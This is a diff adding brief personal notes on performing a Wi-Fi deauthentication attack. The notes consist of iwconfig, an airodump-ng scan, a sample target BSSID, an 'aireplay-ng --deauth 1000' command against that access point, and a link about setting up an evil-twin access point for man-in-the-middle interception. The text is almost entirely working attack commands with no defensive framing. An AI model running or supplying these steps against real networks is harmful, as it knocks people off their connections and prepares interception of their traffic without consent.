@@ -1,0 +1,17 @@
+steps to de-auth
+
+use command blow to wlan mode if monitor or managed(default)
+iwconfig
+
+lets scan the networks around you
+sudo airodump-ng wlan0
+
+Get the BSSID of your target
+04:25:C5:E5:21:B8
+
+The run this based on their BSSID
+aireplay-ng --deauth 1000 -a 04:25:C5:E5:21:B8 wlan0 
+
+
+Man In The Middle Attack we start from here
+https://infosecwriteups.com/how-to-create-an-evil-twin-or-fake-access-point-82451b837415
